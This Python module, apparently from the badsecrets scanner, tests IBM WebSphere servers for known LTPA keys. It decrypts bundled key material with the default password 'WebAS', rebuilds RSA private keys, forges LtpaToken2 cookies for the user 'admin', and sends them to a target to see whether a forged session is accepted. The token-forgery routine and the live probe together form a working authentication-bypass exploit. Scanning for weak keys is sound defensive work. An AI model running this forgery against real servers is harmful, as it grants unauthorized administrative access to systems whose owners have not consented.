import os
import re
import json
import time
import base64
import hashlib
import logging
from contextlib import suppress
from Crypto.Cipher import DES3, AES
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA as SHA1
from badsecrets.base import BadsecretsActiveBase

log = logging.getLogger(__name__)

DEFAULT_PASSWORD = "WebAS"


def _derive_password_key(password):
    """SHA-1(password) padded to 24 bytes with 0x00."""
    sha1 = hashlib.sha1(password.encode("utf-8")).digest()
    return sha1 + b"\x00" * 4


def _des3_ecb_decrypt(key_24, data):
    """3DES-ECB decrypt (no padding removal)."""
    cipher = DES3.new(key_24, DES3.MODE_ECB)
    return cipher.decrypt(data)


def _parse_ibm_private_key(dec_privkey):
    """Parse IBM's custom RSA private key format and return an RSA key object.

    Format (long): [4 bytes: d_length] [d_length bytes: d] [3 bytes: e] [65 bytes: p] [65 bytes: q]
    Format (short, no d): [3 bytes: e] [65 bytes: p] [65 bytes: q]
    """
    e_len = 3
    p_len = 65
    q_len = 65
    min_short = e_len + p_len + q_len  # 133

    if len(dec_privkey) > min_short:
        d_len = (
            ((dec_privkey[0] & 0xFF) << 24)
            | ((dec_privkey[1] & 0xFF) << 16)
            | ((dec_privkey[2] & 0xFF) << 8)
            | (dec_privkey[3] & 0xFF)
        )
        if 0 < d_len < len(dec_privkey) - 4 - min_short:
            d = int.from_bytes(dec_privkey[4 : 4 + d_len], "big")
            offset = 4 + d_len
            e = int.from_bytes(dec_privkey[offset : offset + e_len], "big")
            p = int.from_bytes(dec_privkey[offset + e_len : offset + e_len + p_len], "big")
            q = int.from_bytes(
                dec_privkey[offset + e_len + p_len : offset + e_len + p_len + q_len],
                "big",
            )
        else:
            # Fall through to short format
            d = None
            e = int.from_bytes(dec_privkey[:e_len], "big")
            p = int.from_bytes(dec_privkey[e_len : e_len + p_len], "big")
            q = int.from_bytes(dec_privkey[e_len + p_len : e_len + p_len + q_len], "big")
    elif len(dec_privkey) >= min_short:
        d = None
        e = int.from_bytes(dec_privkey[:e_len], "big")
        p = int.from_bytes(dec_privkey[e_len : e_len + p_len], "big")
        q = int.from_bytes(dec_privkey[e_len + p_len : e_len + p_len + q_len], "big")
    else:
        return None

    if e not in (3, 65537):
        return None

    # Ensure p > q (required by PyCryptodome)
    if p < q:
        p, q = q, p

    n = p * q
    if d is None:
        phi = (p - 1) * (q - 1)
        d = pow(e, -1, phi)

    return RSA.construct((n, e, d, p, q))


def _derive_keyset(entry, password_key):
    """Derive AES key and RSA private key from a ltpa_keys.json entry.
    Returns (aes_key, rsa_key, realm) or None.
    """
    enc_3des = base64.b64decode(entry["3DESKey"])
    master_key = _des3_ecb_decrypt(password_key, enc_3des)
    aes_key = master_key[:16]

    enc_privkey = base64.b64decode(entry["PrivateKey"])
    dec_privkey = _des3_ecb_decrypt(password_key, enc_privkey)
    rsa_key = _parse_ibm_private_key(dec_privkey)
    if rsa_key is None:
        return None

    realm = entry.get("Realm", "defaultRealm")
    return aes_key, rsa_key, realm


def forge_ltpa2_token(aes_key, rsa_key, realm, username="admin"):
    """Forge an LtpaToken2 cookie value.

    1. Build body: expire:{ms}$u:user\\:{realm}/{username}
    2. Sign: base64(PKCS1v15_SHA1(SHA1(body)))
    3. Assemble: body%expire_ms%signature
    4. Encrypt: AES-128-CBC with PKCS5 padding (IV = key)
    5. Base64 encode
    """
    expire_ms = str(int(time.time() * 1000) + 7200000)  # 2 hours from now
    body = f"expire:{expire_ms}$u:user\\:{realm}/{username}"

    # Sign: SHA1withRSA(SHA1(body))
    body_sha1 = hashlib.sha1(body.encode()).digest()
    h = SHA1.new(body_sha1)
    sig = pkcs1_15.new(rsa_key).sign(h)
    sig_b64 = base64.b64encode(sig).decode()

    # Assemble raw token
    raw_token = f"{body}%{expire_ms}%{sig_b64}"

    # Encrypt with AES-128-CBC (IV = first 16 bytes of key)
    iv = aes_key
    cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad(raw_token.encode(), AES.block_size))
    return base64.b64encode(ct).decode()


class LTPA_Token_Key(BadsecretsActiveBase):
    # YARA prefilter: detect WebSphere/Liberty indicators
    yara_prefilter_rule = (
        "rule LTPA_Token_Key_prefilter {"
        " strings:"
        '  $s1 = "LtpaToken2" nocase'
        '  $s2 = "LtpaToken" nocase'
        '  $s3 = "WASReqURL" nocase'
        '  $s4 = "WebSphere" nocase'
        '  $s5 = "/ibm/console" nocase'
        '  $s6 = "com.ibm.ws" nocase'
        " condition: any of them"
        "}"
    )

    description = {
        "product": "IBM WebSphere LTPA",
        "secret": "LTPA Encryption Key",
        "severity": "HIGH",
    }

    def _load_active_keys(self):
        """Load and derive key material from ltpa_active_keys.json."""
        keysets = []
        resource_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "..",
            "resources",
            "ltpa_active_keys.json",
        )
        with suppress(FileNotFoundError):
            with open(resource_path) as f:
                entries = json.load(f)
            password_key = _derive_password_key(DEFAULT_PASSWORD)
            for entry in entries:
                with suppress(Exception):
                    result = _derive_keyset(entry, password_key)
                    if result:
                        aes_key, rsa_key, realm = result
                        keysets.append(
                            {
                                "aes_key": aes_key,
                                "rsa_key": rsa_key,
                                "realm": realm,
                                "key_id": entry.get("key_id", "unknown"),
                                "source": entry.get("source", "unknown"),
                            }
                        )
        return keysets

    async def probe(self, url, custom_keys=None, **kwargs):
        """Probe for known LTPA keys by forging tokens and testing acceptance.

        Strategy:
        1. GET target URL without auth — expect 302/401/403 (auth required)
        2. For each key, forge LtpaToken2, send as cookie
        3. If response is 200 (not redirect/401), the key was accepted
        """
        import httpx

        results = []
        base = re.match(r"(https?://[^/]+)", url)
        if not base:
            return results

        keysets = self._load_active_keys()
        if not keysets:
            return results

        client = self.http_client
        should_close = False
        if client is None:
            client = httpx.AsyncClient(timeout=10, verify=False)
            should_close = True

        try:
            # Step 1: Confirm target requires authentication
            try:
                baseline_resp = await client.get(url, follow_redirects=False)
                if baseline_resp.status_code == 200:
                    log.debug(f"Target {url} returned 200 without auth — skipping LTPA probe")
                    return results
            except Exception as e:
                log.debug(f"Error checking baseline for {url}: {e}")
                return results

            # Step 2: Try each keyset
            for keyset in keysets:
                try:
                    token = forge_ltpa2_token(
                        keyset["aes_key"],
                        keyset["rsa_key"],
                        keyset["realm"],
                    )
                    response = await client.get(
                        url,
                        headers={"Cookie": f"LtpaToken2={token}"},
                        follow_redirects=False,
                    )

                    if response.status_code == 200:
                        log.debug(f"Forged LtpaToken2 accepted by {url}: LtpaToken2={token}")
                        results.append(
                            {
                                "type": "SecretFound",
                                "product": url,
                                "secret": f"LtpaToken2 key {keyset['key_id']} (see ltpa_active_keys.json)",
                                "location": "active_probe",
                                "details": {
                                    "key_id": keyset["key_id"],
                                    "key_source": keyset["source"],
                                    "realm": keyset["realm"],
                                },
                            }
                        )
                    else:
                        log.debug(
                            f"LTPA key from {keyset['source']} rejected by {url} (status {response.status_code})"
                        )
                except Exception as e:
                    log.debug(f"Error probing {url} with LTPA key from {keyset['source']}: {e}")

        finally:
            if should_close:
                await client.aclose()

        return results
